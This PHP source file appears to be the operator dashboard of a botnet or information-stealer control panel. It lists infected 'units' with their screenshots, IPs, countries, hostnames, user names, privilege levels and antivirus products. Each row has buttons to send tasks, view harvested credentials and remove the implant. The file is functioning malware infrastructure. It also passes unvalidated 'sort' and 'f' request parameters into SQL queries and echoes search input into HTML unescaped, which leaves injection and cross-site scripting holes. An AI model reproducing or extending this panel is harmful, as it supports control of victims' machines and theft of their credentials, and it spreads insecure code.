<?php
    
   session_start();

   if (!(isset($_SESSION['Name'])))
   {
      header("Location: Login.php");
      exit;
   }

   include("Header.php");
   include("Cfg/Config.php");
   include("Cfg/Options.php");
   include("Cfg/Sync.php");
   include("Cfg/Tags.php");
   include("Functions.php");

   CheckSQL();

   function aGetCountryIndex($ip)
   {
      include_once("F.st/geo_ip.php");
      $geoip = geo_ip::getInstance("F.st/geo_ip.dat");
      return $geoip -> lookupCountryCode($ip);
   }

   $link = mysqli_connect($conf['dbhost'], $conf['dbuser'], $conf['dbpass']);
   mysqli_select_db($link, $conf['dbname']);

   if ($_GET["f"])
   { 
      $f = ($_GET["f"]);
   }
   else
   {
      $f = 0;
   }

   if ($_GET["sort"] == "")
   {
      $so = "id";
      $J = "id";
   }
   else
   {
      $so = $_GET["sort"];
      $J = $_GET["sort"];
   }

   $Search = $_GET["Search"];

   if ($_GET["show"] == 'all' || $Search != "")
   {     
      $all = mysqli_query($link, "SELECT * FROM units");

      if ($Search == "")
      {
         $result = mysqli_query($link, "SELECT * FROM units ORDER BY $J DESC LIMIT $f, 100");
      }
      else
      {
         $result = mysqli_query($link, "SELECT * FROM units ORDER BY $J DESC");
      }
   
   }
   else
   {
      $all = mysqli_query($link, "SELECT * FROM units WHERE online > " . (time() - $options["sync_time"] * 60));

      if ($Search == "")
      {
         $result = mysqli_query($link, "SELECT * FROM units WHERE online > " . (time() - $options["sync_time"] * 60) . " ORDER BY $J DESC LIMIT $f, 100");
      }
      else
      {
         $result = mysqli_query($link, "SELECT * FROM units WHERE online > " . (time() - $options["sync_time"] * 60) . " ORDER BY $J DESC");
      }
   }  
           
   echo "<table cellpadding=0 cellspacing=0 width=\"100%\" style =\"border: 0px solid;\">
         <tr style=background-color:#11101d; height=\"50\">
            <td>
               <div align = center>
                  <font color=\"#E4E9F7\">" . $lang["_001"] . $_SESSION['Name'] . $lang["_003"] . GetUnitsCount() . $lang["_004"] . GetOnlineUnitsCount() . $lang["_005"] .
                  "</font>
               </div>
            </td>
         </tr>
         <tr>
            <td>
               <img src=\"Images\Ang.png\" align=\"top\"></img>
            </td>
         </tr>
      </table>";

   echo "<div align = center> 
            <table cellpadding=0 cellspacing=0 width=\"98%\">
               <tr height=\"35\">
                  <td>
                     <div align = right>
                        <form action=\"Show_Units.php\" . method=\"get\">
                           <input type=\"text\" class=\"task\" name=\"Search\" value=\"" . $_GET["Search"] . "\">
                           <input type=\"submit\" class=\"button_search\" value=\"" . $lang["0165"] . "\">
                        </form>
                     </div>
                  </td>
               </tr>
            </table>";

   sTable();

   $Show = $_GET["show"];

   if (GetOnlineUnitsCount() > 0 || (GetUnitsCount() > 0 && $Show == "all") || $Search != "")
   {
      echo "<div align = center> 
      <table cellpadding=1 cellspacing=1 width=\"98%\" class=table style =\"border: 1px solid;\">
         <tr>
            <td><div align = center> <a href=\"Show_Units.php?sort=id" . "&f=" . $_GET["f"] . "&show=" . $_GET["show"] . "\"><img src=\"Images\ic_sort.png\"></a>&nbsp;" . $tags["t004"] . $lang["0022"] . ":" . $tags["t005"] .  "</div></td>";

            if ($options["show_screen"] == "1")
            {
               echo "<td><div align = center>&nbsp;" . $tags["t004"] . $lang["0023"] . ":" . $tags["t005"] . "</div></td>";
            }
            
            echo "<td><div align = center> <a href=\"Show_Units.php?sort=sid" . "&f=" . $_GET["f"] . "&show=" . $_GET["show"] . "\"><img src=\"Images\ic_sort.png\"></a>&nbsp;" . $tags["t004"] . $lang["0024"] . ":" . $tags["t005"] . "</div></td>";

            if ($options["show_il"] == "1")
            {
               echo "<td><div align = center> <a href=\"Show_Units.php?sort=il" . "&f=" . $_GET["f"] . "&show=" . $_GET["show"] . "\"><img src=\"Images\ic_sort.png\"></a>&nbsp;" . $tags["t004"] . $lang["0025"] . ":" . $tags["t005"] . "</div></td>";
            }

            echo "
            <td><div align = center> <a href=\"Show_Units.php?sort=country" . "&f=" . $_GET["f"] . "&show=" . $_GET["show"] . "\"><img src=\"Images\ic_sort.png\"></a>&nbsp;" . $tags["t004"] . $lang["0014"] . ":" . $tags["t005"] . "</div></td>
            <td><div align = center> <a href=\"Show_Units.php?sort=version" . "&f=" . $_GET["f"] . "&show=" . $_GET["show"] . "\"><img src=\"Images\ic_sort.png\"></a>&nbsp;" . $tags["t004"] . $lang["0026"] . ":" . $tags["t005"] . "</div></td>";

            if ($options["show_domain"] == "1")
            {
               echo "<td><div align = center> <a href=\"Show_Units.php?sort=dm" . "&f=" . $_GET["f"] . "&show=" . $_GET["show"] . "\"><img src=\"Images\ic_sort.png\"></a>&nbsp;" . $tags["t004"] . $lang["0027"] . ":" .$tags["t005"] .  "</div></td>";
            }
            
            if ($options["show_hostname"] == "1")
            {
               echo "<td><div align = center> <a href=\"Show_Units.php?sort=pc" . "&f=" . $_GET["f"] . "&show=" . $_GET["show"] . "\"><img src=\"Images\ic_sort.png\"></a>&nbsp;" . $tags["t004"] . $lang["0028"] . ":" . $tags["t005"] . "</div></td>";
            }

            if ($options["show_username"] == "1")
            {
               echo "<td><div align = center> <a href=\"Show_Units.php?sort=un" . "&f=" . $_GET["f"] . "&show=" . $_GET["show"] . "\"><img src=\"Images\ic_sort.png\"></a>&nbsp;" . $tags["t004"] . $lang["0029"] . ":" . $tags["t005"] . "</div></td>";
            }

            if ($options["show_av"] == "1")
            {
               echo "<td><div align = center> <a href=\"Show_Units.php?sort=av" . "&f=" . $_GET["f"] . "&show=" . $_GET["show"] . "\"><img src=\"Images\ic_sort.png\"></a>&nbsp;" . $tags["t004"] . $lang["0030"] . ":" . $tags["t005"] . "</div></td>";
            }

            echo "                                   
            <td><div align = center> <a href=\"Show_Units.php?sort=online" . "&f=" . $_GET["f"] . "&show=" . $_GET["show"] . "\"><img src=\"Images\ic_sort.png\"></a>&nbsp;" . $tags["t004"] . $lang["0031"] . ":" . $tags["t004"] . "</div></td>";
            
            if ($options["show_reg"] == "1")
            {
               echo "<td><div align = center> <a href=\"Show_Units.php?sort=reg" . "&f=" . $_GET["f"] . "&show=" . $_GET["show"] . "\"><img src=\"Images\ic_sort.png\"></a>&nbsp;" . $tags["t004"] . $lang["0032"] . ":" . $tags["t005"] . "</div></td>";
            }
            
            if ($_SESSION['Name'] != $conf["observer_login"])
            {
               echo "<td><div align = center>" . $tags["t004"] . $lang["0033"] . ":" . $tags["t005"] . "</div></td>";
            }

      echo "</tr>";

      while ($row = mysqli_fetch_array($result))
      { 
         if (strpos($row['id'], $Search) || strpos($row['sid'], $Search) || strpos($row['ip'], $Search) || strpos($row['country'], $Search) || $row['version'] == $Search || $row['pc'] == $Search || $row['un'] == $Search || $Search == "" || $row['id'] == $Search || $row['sid'] == $Search || $row['ip'] == $Search || $row['country'] == $Search || $row['version'] == $Search || $row['pc'] == $Search || $row['us'] == $Search)
         {
            $gb = GetBG();

            if (time() - $row['online'] < ($options["sync_time"] * 60))
            {
               $ico = "\\Online.png";
            }
            else
            {
               $ico = "\\Offline.png";
            }

            if ($row['lv'] == 1)
            {
               $level = "<font color=red>" . $lang["0150"] . "</font>";
            }
            else
            {
               $level = $lang["0151"];
            }

            if ($row['og'] == 1)
            {
               $exe = $lang["0161"];
            }
            else
            {
               $exe = $lang["0162"];
            }
         
            if ($options["show_screen"] == "1")
            {
               if ((file_exists('Screens/' . $row['id'] . '.jpg')) || (file_exists('Screen\\' . $row['id'] . '.jpg')))      
               {   
                  $srceen = "<div align=center><a href=Screens\\" . $row['id'] . ".jpg><img class=\"images\" src=\"Screens\\" .$row['id'] . ".jpg\" width=107 height=60></a></div>";    
               }
            }

            echo "<tr height=\"80\">
                  <td bgcolor = " . $gb . ">" . "<div align = center><img src=\"Images" . $ico .  "\"></div>" . "</td>";
               
            if ($options["show_screen"] == "1")
            {
               echo "<td bgcolor = " . $gb . ">" .  $srceen . "</td>";
            }

            echo "<td bgcolor = " . $gb . ">" . 
                     "<table>" . 
                        "<tr>" . "<td>" . "<img src=\"Images\AR.png\"> " . $tags["t000"] . $lang["0034"] . ": " . $tags["t001"] . "</td>" . "<td>" . "<a href=\"Unitinfo.php?id=" . $row['id'] . "\">" . $tags["t002"] . $row['id'] . $tags["t003"] . "</a>" . "</td>" . "</tr>" .
                        "<tr>" . "<td>" . "<img src=\"Images\AR.png\"> " . $tags["t000"] . $lang["0035"] . ": " . $tags["t001"] . "</td>" . "<td>" . "<a href=\"Unitinfo.php?id=" . $row['id'] . "\">" . $tags["t002"] . $row['sid'] . $tags["t003"] . "</a>" . "</td>" . "</tr>" .
                        "<tr>" . "<td>" . "<img src=\"Images\AR.png\"> " . $tags["t000"] . $lang["0160"] . ": " . $tags["t001"] . "</td>" . "<td>" . $tags["t002"] . $exe . $tags["t003"] . "</td>" . "</tr>" .
                     "</table>" .
                  "</td>";

            if ($options["show_il"] == "1")
            {
               echo "<td bgcolor = " . $gb . "><div align = left>" . "&nbsp;<img src=\"Images\Version.png\"> " . $tags["t002"] . $level . $tags["t003"] . "</div></td>";
            }

            echo "<td bgcolor = " . $gb . "><table border=\"0\" width=\"100%\">
                     <tr>
                        <td rowspan=\"2\" width=\"120\">";
         
                     if (aGetCountryIndex($row['ip']) <> "?")
                     {
                        echo "&nbsp;<img class=\"images\" src=\"Images\Flags\\" . strtolower(aGetCountryIndex($row['ip'])) .  ".png\" height=\"60\" width=\"100\">"; 
                     }
                     else
                     {
                        echo "&nbsp;<img class=\"images\" src=\"Images\Flags\\" . "unk" .  ".png\"height=\"60\" width=\"100\">"; 
                     }
         
            echo "</td>
                  <td>" . $tags["t002"] . $row['country'] . " (" . aGetCountryIndex($row['ip']) . ")" . $tags["t003"] . "</td></td>
   
            </tr>
            <tr><td>" . $tags["t002"] . $row['ip'] . $tags["t003"] . "</td></tr>
         
            </table></td>";

            echo "<td bgcolor = " . $gb . "><div align = left>" . "&nbsp;<img src=\"Images\Version.png\"> " . $tags["t002"] . $row['version'] . $tags["t003"] . "</div></td>";

            if ($options["show_domain"] == "1")
            {
               echo "<td bgcolor = " . $gb . "><div align = left>" . "&nbsp;<img src=\"Images\PC.png\"> " . $tags["t002"] . substr($row['dm'], 0, 25) . $tags["t003"] . "</div></td>";
            }
                  
            if ($options["show_hostname"] == "1")
            {
               echo "<td bgcolor = " . $gb . ">" . 
                           "<table>" . 
                              "<tr>" . "<td>" . "<img src=\"Images\PC.png\"> " . $tags["t000"] . $lang["0037"] . ": " . $tags["t001"] . "</td>" . "<td>" . $tags["t002"] . substr($row['pc'], 0, 25) . $tags["t003"] . "</td>" . "</tr>" .
                              "<tr>" . "<td>" . "<img src=\"Images\User.png\"> " . $tags["t000"] . $lang["0038"] . ": " . $tags["t001"] . "</td>" . "<td>" . $tags["t002"] . substr($row['un'], 0, 25) . " [" . substr($row['ar'], 0, 25) . "]" . $tags["t003"] . "</td>" . "</tr>" .
                              "<tr>" . "<td>" . "<img src=\"Images\OS.png\"> " . $tags["t000"] . $lang["0039"] . ": " . $tags["t001"] . "</td>" . "<td>" . $tags["t002"] . $row['os'] . " [" . $row['arch'] . "]" . $tags["t003"] . "</td>" . "</tr>" .
                           "</table>" . 
                        "</td>";
            }

            if ($options["show_username"] == "1")
            {
               echo "<td bgcolor = " . $gb . "><div align = left>" . "&nbsp;<img src=\"Images\User.png\"> " . $tags["t002"] . substr($row['un'], 0, 25) . " [" . $row['ar'] . "]" . $tags["t003"] . "</div></td>";
            }

            if ($options["show_av"] == "1")
            {
               echo "<td bgcolor = " . $gb . "><div align = left>" . "&nbsp;<img src=\"Images\AV.png\"> " . $tags["t002"] . $row['av'] . $tags["t003"] . "</div></td>";
            }

            echo "<td bgcolor = " . $gb . "> <div align = center>";
                  
            if ((time() - $row['online']) < ($options["sync_time"] * 60))
            {
               echo "&nbsp;<img src=\"Images\Time.png\"> " . $tags["t002"] . date("i", (time() - $row['online'])) . $lang["0137"] . date("s", (time() - $row['online'])) . " " . $lang["0136"] . $tags["t003"]; 
            }
            else
            {
               echo "&nbsp;<img src=\"Images\Time.png\"> " . $tags["t002"] . date("d|m|Y H:i", ($row['online'])) . $tags["t003"];
            }

            echo "   </div>
                  </td>";

            if ($options["show_reg"] == "1")
            {
               echo "<td bgcolor = " . $gb. "><div align = center>" . "&nbsp;<img src=\"Images\Time.png\"> " . $tags["t002"] . date("d|m|Y H:i", ($row['reg'])) . $tags["t003"] . "</div></td>";
            }

            if ($_SESSION['Name'] != $conf["observer_login"])
            {
               $r_id = $row['id'];

               echo  "<td bgcolor = " . $gb. ">" . 
               "<div align = center><table>" . 
                  "<tr><td>" . "<button class='buttont' onclick=\"window.location.href = 'Make_Task.php?count=1&unit=$r_id';\">" . $lang["0040"] . "</button>" . "</td></tr>" . 
                  "<tr><td>" . "<button class='buttont' onclick=\"window.location.href = 'Show_Cred.php?showid=$r_id';\">" . $lang["0041"] . "</button>" . "</td></tr>" . 
                  "<tr><td>" . "<button class='buttonr' onclick=\"window.location.href = 'Make_Task.php?rem=1&count=1&unit=$r_id';\">" . $lang["0042"] . "</button>" . "</td></tr>" . 
               "</table></div></td>";
            }

            echo "</tr>";
         }     
      }

      echo "   </table>
            </div>";

      echo " <div align = center><table width=\"98%\">
                  <tr>
                     <td>";

      if ($_GET["show"] == all)
      {
         $sa = "&show=all";
      }

      while (mysqli_num_rows($all) > $i0)
      {    
         if (mysqli_num_rows($all) > $i0) 
         { 
            $total_pages++; 
         }

         $i0 = $i0 + 100;
      }

      $current_page = ($f / 100) + 1;

      if ($total_pages > 1)
      {

         if ($Search == "")
         {
            echo "<div class=\"bblock1\"> " . $lang["0043"] . ": " . $current_page . "/" . $total_pages . "</div>";

            while (mysqli_num_rows($all) > $i)
            {    
               if (mysqli_num_rows($all) > $i) 
               { 
                  $c++;
               
                  if (mysqli_num_rows($all) > 100) 
                  {
                     if (($current_page - 15) < (($i / 100) + 1) && ($current_page + 15) > (($i / 100) + 1) && (($i / 100) + 1) <> $current_page)
                     {
                        echo "<div class=\"bblock1\"><a href=\"Show_Units.php?sort=" . $so . "&f=" . $i . $sa . "\">" . $c . "</a></div>";
                     }

                     if ((($i / 100) + 1) == $current_page)
                     {
                        echo "<div class=\"bblock2\"><a href=\"Show_Units.php?sort=" . $so . "&f=" . $i . $sa . "\">" . $c . "</a></div>";
                     }
                  }
               }

               $i = $i + 100;
            }
         }

         echo "           
            </td>
               </tr>
                  </table>
               </div>";
      }
   }
   else 
   {
      echo "<table border=\"0\" width=\"100%\" height=\"300\">
               <tr>
                  <td>
                     <div align = center>" . $lang["0154"] . "</div>
                  </td>
               </tr>
            </table>";
   }

   mysqlI_close($link);

   include("Footer.php");
?>